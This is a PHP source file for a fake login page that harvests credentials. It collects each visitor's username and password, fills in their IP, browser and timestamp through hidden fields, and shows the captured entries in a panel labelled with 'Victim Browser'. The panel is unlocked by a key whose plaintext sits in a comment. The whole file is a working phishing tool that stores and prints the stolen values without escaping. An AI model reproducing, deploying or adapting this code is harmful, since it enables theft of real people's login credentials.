<?php
session_start();
date_default_timezone_set('Asia/Jakarta');
if (!isset($_SESSION['tasks'])) {
    $_SESSION['tasks'] = [];
}
function inputValid($input_name) {
    return isset($_POST[$input_name]) && ! empty($_POST[$input_name]);
}
function getIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'Unknown';
    return $ipaddress;
}
function getBrowser() {
    $u_agent 	= $_SERVER['HTTP_USER_AGENT'];
    $bname 		= 'Unknown';
    $platform 	= 'Unknown';
    $version 	= "";

    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'linux';
    }
    elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'mac';
    }
    elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'Windows';
    }
   
    if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)) {
        $bname 	= 'Internet Explorer';
        $ub 	= "MSIE";
    }
    elseif(preg_match('/Firefox/i',$u_agent)) {
        $bname 	= 'Mozilla Firefox';
        $ub 	= "Firefox";
    }
    elseif(preg_match('/Chrome/i',$u_agent)) {
        $bname 	= 'Google Chrome';
        $ub 	= "Chrome";
    }
    elseif(preg_match('/Safari/i',$u_agent)) {
        $bname 	= 'Apple Safari';
        $ub 	= "Safari";
    }
    elseif(preg_match('/Opera/i',$u_agent)) {
        $bname 	= 'Opera';
        $ub 	= "Opera";
    }
    elseif(preg_match('/Netscape/i',$u_agent)) {
        $bname 	= 'Netscape';
        $ub 	= "Netscape";
    }
   
    $known		= array('Version', $ub, 'other');
    $pattern 	= '#(?<browser>' . join('|', $known) .
    ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
    if (!preg_match_all($pattern, $u_agent, $matches)) {}
   
    $i = count($matches['browser']);
    if ($i != 1) {
        if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
            $version = $matches['version'][0];
        }
        else {
            $version = $matches['version'][1];
        }
    }
    else {
        $version = $matches['version'][0];
    }
   
    if ($version == null || $version == "") {
    	$version = "?";
    }
   
    return array(
        'userAgent' => $u_agent,
        'name'      => $bname,
        'version'   => $version,
        'platform'  => $platform,
        'pattern'   => $pattern
    );
}
function info($name) {
	if ($name === 'ip') {
		return getIP();
	} elseif ($name === 'browser') {
		$browser = getBrowser();

		return $browser['name']." ".$browser['version']." on ".$browser['platform'];
	}
}

if (isset($_GET['reset'])) {
	unset($_SESSION['tasks']);
}
if (inputValid('username') && inputValid('password') && inputValid('date') && inputValid('ip') && inputValid('browser')) {
    $new_task = [
        'username'	=> $_POST['username'],
        'password'  => $_POST['password'],
        'date'		=> $_POST['date'],
        'ip'		=> $_POST['ip'],
        'browser'	=> $_POST['browser']
    ];

    $_SESSION['tasks'][] = $new_task;

}
?>
<style type="text/css">
	@import url('https://fonts.googleapis.com/css2?family=Andika+New+Basic&display=swap');
	.basic {
		font-family: 'Andika New Basic', sans-serif;
		position: absolute;
		padding:20px;
		background: #fff;
		border-radius:20px;
		border:1.5px solid rgba(0,0,0,0.12);
	}
	.label {
		min-width:130px;
		display: inline-block;
		padding-top:5px;
		padding-bottom:5px;
	}
	.p {
		display: inline-block;
		padding-top:5px;
		padding-bottom:5px;
	}
	.user, .pass, .date, .ip, .browser{
		display: inline-block;
		padding-top:5px;
		padding-bottom:5px;
	}
	.bungkus {
		border:1.5px solid rgba(0,0,0,0.12);
		border-radius:10px;
		margin-bottom:7px;
		padding:15px;
	}
	.result {
		padding-bottom:10px;
		font-size:25px;
	}
</style>
<form method="post">
	<input type="text" name="username" placeholder="Username">
	<input type="text" name="password" placeholder="Password">
	<input type="hidden" name="date" value="<?= date("d/m/Y - H:i") ?>">
	<input type="hidden" name="ip" value="<?= info('ip') ?>">
	<input type="hidden" name="browser" value="<?= info('browser') ?>">
	<button>Login</button>
</form>
<?php
$key = "65d592ca6de0975858e73068ddb745bea5b095e0"; //sha1(rabbitx)
if (empty($key) || (isset($_GET['key']) && (sha1($_GET['key']) == $key))) {
	?>
	<div class="basic">
		<div class="result">Result</div>
		<?php
		foreach($_SESSION['tasks'] as $key => $value): ?>
			
			<div class="bungkus">
				<div class="label">
					Username
				</div>
				<div class="p">:</div>
				<div class="user">
					<?= $value['username'] ?>
				</div>
				<br>

				<div class="label">
					Password
				</div>
				<div class="p">:</div>
				<div class="pass">
					<?= $value['password'] ?>
				</div>
				<br>

				<div class="label">
					Date
				</div>
				<div class="p">:</div>
				<div class="date">
					<?= $value['date'] ?>
				</div>
				<br>

				<div class="label">
					IP
				</div>
				<div class="p">:</div>
				<div class="ip">
					<?= $value['ip'] ?>
				</div>
				<br>

				<div class="label">
					Victim Browser
				</div>
				<div class="p">:</div>
				<div class="browser">
					<?= $value['browser'] ?>
				</div>
			</div>
		<?php endforeach; ?>
	</div>
	<?php
}
?>
</body>
</html>
